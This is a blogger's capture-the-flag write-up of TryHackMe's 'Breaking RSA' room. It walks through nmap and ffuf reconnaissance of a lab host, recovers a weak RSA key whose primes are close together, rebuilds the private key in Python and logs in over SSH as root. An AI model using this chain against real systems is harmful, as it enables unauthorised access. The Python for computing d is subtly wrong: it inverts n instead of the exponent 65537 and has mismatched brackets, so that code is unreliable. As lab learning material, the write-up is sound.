# Breaking RSA

The room can be found at [https://tryhackme.com/room/breakrsa](https://tryhackme.com/room/breakrsa).

[RSA](https://en.wikipedia.org/wiki/RSA\_\(cryptosystem\)) is a encryption technique used in asymmetric key cryptography. It relies on the fact that multiplying two large prime numbers (p and q) is easy, but factoring a huge number (n) into factors is pretty difficult. By huge number I mean very very huge - 1000 digits huge, even.

This room talks about a weakness in RSA key generation, in which the chosen prime numbers (p and q) are not far apart. In such a case, Fermat's Factorization method can be used to factor the modulus (the huge number we talked about earlier), which is part of the public key. I think this paper titled "Fermat Factorization in the Wild" by Hanno Böck has a detailed explanation of it. It's linked at the bottom.

## Computer stuff

So now that the theory is out of the way, let us run a nmap SYN scan on the remote server.

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sS -sV 10.10.142.96
```
{% endcode %}

This shows some open services.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>Running services!</p></figcaption></figure>

I also ran a UDP scan and that took a while (18 mins?) to complete, and I found one more service (DHCP client) there on port 68, but I think that does not count for the answer to the first question.

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
nmap -sU -sV 10.10.142.96
```
{% endcode %}

We know there is a http server, so lets see what it has on it. The root directory on the server `http://10.10.142.96` has some text on it, but nothing really helpful.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>Nothing interesting in the html of http://10.10.142.96/</p></figcaption></figure>

Let us check if there are any other common directories that this webserver is exposing.

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -u http://10.10.143.96/FUZZ -w /usr/share/seclists/Discovery/Web-Content/dsstorewordlist.txt | grep "\[Status:" >> ffuf.txt
```
{% endcode %}



What that bit of code does is make URLs by replacing the word "FUZZ" with the words found in the list, and then make HTTP requests to those URLs. Only the URLs that respond with a Status Codes 200, 204, 301, 302, 307, 401 and 403 are logged, and I save these ones to a file.&#x20;

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>Replace &#x3C;hidden_dir> with whatever is in the blurred part.</p></figcaption></figure>

So this gives us a hidden directory, which i wont name, but lets call it _hidden\_dir_. So we browse to `http://10.10.143.96/<hidden_dir>` . It has two files, a text file called _log.txt_, and a RSA public key file called _id\_rsa.pub_.

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>Content of <em>log.txt</em></p></figcaption></figure>

The file explains the SSH concept we discussed before. It also tells us SSH root login is enabled on the server. This means we can login directly as root when connecting to the server using ssh later.

Next, we try to read the public key file, _id\_rsa.pub_ using `openssl`.

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>That did not work :/</p></figcaption></figure>

It seems openssl can't load it? On viewing the contents of the file using `cat` it starts with a `ssh-rsa` text, followed by some base64 characters. So far, the keys I have run into in the [introtocrypto ](https://tryhackme.com/room/cryptographyintro)TryHackMe room had this header: `----BEGIN PRIVATE KEY----` and had a _.pem_ extension. This one is different.&#x20;

<figure><img src="../.gitbook/assets/3ee30a2b-8655-4eaa-b744-1829ae8499bb_text.gif" alt=""><figcaption></figcaption></figure>

Disclaimer: We are now entering trial and error territory. This is probably normal? I think.

So, I can think of two ways to deal with this problem.&#x20;

* Decode the Base64 in the key file:

{% code overflow="wrap" lineNumbers="true" %}
```bash
cat id_rsa.pub | cut -f 2 -d " " | base64 -d
```
{% endcode %}

The `cut` command leaves only the base64 portion of the key, and we try to decode it. Yeah, this won't do.

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>Complete gibberish</p></figcaption></figure>

*   Find a way to view a ssh-rsa key: With some googling I found that `ssh-keygen` can convert this _ssh-rsa_ key into a _pem_ key. We are familiar with that one! Amazing.&#x20;

    Magic conversion code:&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh-keygen -f id_rsa.pub -e -m pem >> id_rsa.pem
```
{% endcode %}

The -e flag makes it convert the OpenSSH key file and turn it into a different format, here -m specifies it to the the PEM format. We write this output to _id\_rsa.pem_

We can load this in `openssl` which we were using earlier.

{% code overflow="wrap" lineNumbers="true" %}
```bash
openssl rsa -in id_rsa.pem -text -modulus
```
{% endcode %}

This gives us the modulus (n) in what seems to be base64. It also tells us how long the key is. That's one of the answers to the room.

{% code overflow="wrap" lineNumbers="true" %}
```
n = EB661F287BC43C8FA92DDBA219F74EA467B5F2277B05095733B351AA7BCC3B66053E5C62F6BE9483D74D1A9DD3D03300E2DF0317F7C12F1146D3B5CA0CE29F3ADC2DE1DB78943A9999DCCC3CCF9D5BF431178CF2EE9CF9F0018C6123174FEDCCCA95F81409EDA7E3D407B93AAD184FC6B3E6AF8CF70FAD973756B180BA114CE0FF9EE0209B77D37332D057ACEE47A1257A3C4C3B35247BB160DC010E3B71DDBCED4F21F6121FF4F6A3EA15C9F28B5EAECD029207DBB86F7D49557292856431F8915C8A6EF88AFC16ED75D3736DFDCBF99C95F987F2A9750F225D5A29990345CCD1498D4D837BD96884B95466933CD5F3F5703C30185DD7E76173819ED8EBB25EE7A473FDF73C24C86AA91F8DE4FE48C817122657F20921937C37FE0CD8A2A1119C3C52301FEF1C22FF5751EF5014AA3DB5523C12513A53CD2C5F1518BD283908F72080A272EBC0C44F64D2C4EFC019CCF106349FB7F04743EBF071B1AD1275A0BD9AB2678F6EB0C01F833D2DEAA169E20D612850AEB5D30CBCFA076F5C46C3D6F51616CB130EA3F6CEE532BA1B691BB9791880708AC9B6FFB986A5FAAFA968397A5DD08A75847FD89257B67C57E251F35609C15FADED80210D69C7DA4BD2D83CC75347779E5E74074D63799B93723AEA7B610396B416B2AB9C48035CB54B24A3C450CC18F098403A2CDD382A5BDACC0FC2FA733B7D8E8E336EB3BB4A4917BCEF
```
{% endcode %}

This does not translate to anything meaningful on base64 decoding either. So I went googling again..

And found this. [https://crypto.stackexchange.com/questions/18031/how-to-find-modulus-from-a-rsa-public-key](https://crypto.stackexchange.com/questions/18031/how-to-find-modulus-from-a-rsa-public-key)

And realised this was getting very complicated very fast.

I also remembered that the question page says to use _pycryptodome_ to do the RSA calculcations, so lets try that approach. We can always come back to this one.

Time to bring the crAzY python skillz out.

{% code overflow="wrap" lineNumbers="true" %}
```python
>>> from Cryptodome.PublicKey import RSA
'''
close this f object later. 
lets try with the .pub file, if it works directly, 
we didn't even need to convert it to pem before
'''
>>> f = open("id_rsa.pub", "rb") 
>>> data = f.read()
>>> f.close()
>>> key = RSA.import_key(data)
>>> key.n
960343778775549488806716229688022562692463185460664314559819511657255292180827209174624059690060629715513180527734160798185034958883650709727032190772084959116259664047922715427522089353727952666824433207585440395813418471678775572995422248008108462980790558476993362919639516120538362516927622315187274971734081435230079153205750751020642956757117030852053008146976560531583447003355135460359928857010196241497604249151374353653491684214813678136396641706949128453526566651123162138806898116027920918258136713427376775618725136451984896300788465604914741872970173868541940675400325006679662030787570986695243903017923121105483935334289783830664260722704673471688470355268898058414366742781725580377180144541978809005281731232604162936015554289274471523038666760994260315829982230640668811250447030003462317740603204577123985618718687833015332554488836087898084147236609893032121172292368637672349405254772581742883431648376052937332995630141793928654990078967475194724151821689117026010445305375748604757116271353498403318409547515058838447618537811182917198454172161072247021099572638700461507432831248944781465511414308770376182766366160748136532693805002316728842876519091399408672222673058844554058431161474308624683490000000000
```
{% endcode %}

This is a long number. Since this the answer to one of the questions, I intentionally removed the last 10 digits.

So now that we have _n_, we need to factor it. We could write code to do that, code that would be able to handle large numbers. OR. We could use a list of all the numbers and their known prime factors. Yep, that exists. Enter [factordb.com](http://factordb.com/)

So running our modulus through factordb, we get the prime factors as follows:

{% code overflow="wrap" lineNumbers="true" %}
```python
>>> p = 30989413979221186440875537962143588279079180657276785773483163084840787431751925008409382782024837335054414229548213487269055726656919580388980384353939415484564294377142773553463724248812140196477077493185374579859773369113593661078143295090153526634169495633688691753691720088511452131593712380121967802013042678209312444897975134224456911144218687330712554564836016616829044029963400114373142702236623994027926718855592051277298418373056707389464234977873660836337340136755093657804153998347162906059312569124331219753644648657722107663012261197728061352359157767204739644300066112274629356310784052940617408516621
>>> q = 30989413979221186440875537962143588279079180657276785773483163084840787431751925008409382782024837335054414229548213487269055726656919580388980384353939415484564294377142773553463724248812140196477077493185374579859773369113593661078143295090153526634169495633688691753691720088511452131593712380121967802013042678209312444897975134224456911144218687330712554564836016616829044029963400114373142702236623994027926718855592051277298418373056707389464234977873660836337340136755093657804153998347162906059312569124331219753644648657722107663012261197728061352359157767204739644300066112274629356310784052940617408518123
```
{% endcode %}

The difference of these numbers is indeed very small.&#x20;

Now to calculate the private key, d.

d = modinv(65537, lcm((p-1),(q-1)))

We can do this in python 3.8+ with the following expression:

{% code overflow="wrap" lineNumbers="true" %}
```python
>>> math.pow(p*q, -1, math.lcm(p-1,q-1))
```
{% endcode %}

So, now that we have d, we should be able to craft the private key, and dump it to the filesystem, and use it to ssh into the root user's account on the server.

{% code overflow="wrap" lineNumbers="true" %}
```python
>>> from math import lcm
>>> priv_key = RSA.construct(tuple([p*q,65537,pow(p*q, -1, lcm(p-1,q-1),p,q]), consistency_check=True)
>>> data = priv_key.export_key(format='OpenSSH')
>>> f = open('private_key', 'wb')
>>> f.write(data)
>>> f.close()
```
{% endcode %}

We should have a file by the name of _private\_key_ in the directory that we opened the python shell in.

Let's trying ssh'ing into 10.10.142.96.

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh -i private_key root@10.10.142.96
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>UNPROTECTED FILE???</p></figcaption></figure>

A couple of things I learnt here after spending \*only\* a couple hours:

* The private key needs to have permissions 600 or 400, else the ssh client throws an error. Do `chmod 600 <filename>` to change permissions. 600 is a mask for the user having read and write permissions on the file.
* \*deep breaths\* This part was very annoying but there are [way too many types of RSA keys](https://superuser.com/questions/1515261/how-to-quickly-identify-ssh-private-key-file-formats).&#x20;
* Exporting a private RSA key in OpenSSH format will export the corresponding public key instead. Found this out by comparing the public key from before and private key I generated and finding out they are the same. Moreover, the private key from a new keypair generated using `ssh-keygen` is way larger than whatever private key we exported here.

So I had to do some more trial and error with the other export key types that PyCryptodome offers (PEM and DER). I exported both of them as _private\_key.pem_ and _private\_key.der_ and changed their permissions to 600.

Then I tried using them to ssh into the server. The PEM key worked, the DER one did not.

The flag was there upon logging in.

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>Done!</p></figcaption></figure>

## Notes/Links:

1. Fermat Factorization in the Wild: [https://eprint.iacr.org/2023/026.pdf](https://eprint.iacr.org/2023/026.pdf).
2. The wordlist used with ffuf is from Daniel Miessler's Seclist Repository, [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists).
3. ffuz can be found at [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf) and for more info on HTTP Status Codes, this is a good read [https://developer.mozilla.org/en-US/docs/Web/HTTP/Status](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status). It helped me out when making backend APIs at my last job.
4. wget is a tool used to make HTTP requests and retrieve files using it. It can use other protocols too. For details, [https://www.gnu.org/software/wget/](https://www.gnu.org/software/wget/).
5. cat basically prints the content of a file to the terminal.
6. grep only shows lines that contain the string patterns it is given as arguments. The -v flag only shows lines that DO NOT contain the string pattern.
7. PyCryptodome - [https://www.pycryptodome.org/](https://www.pycryptodome.org/)
8. I'll probably write the factoring code and try it by hand too at some point, but not today.&#x20;
9. The PEM key seems to be PKCS#1/OpenSSL compliant, as per the superuser link: [https://superuser.com/questions/1515261/how-to-quickly-identify-ssh-private-key-file-formats](https://superuser.com/questions/1515261/how-to-quickly-identify-ssh-private-key-file-formats)
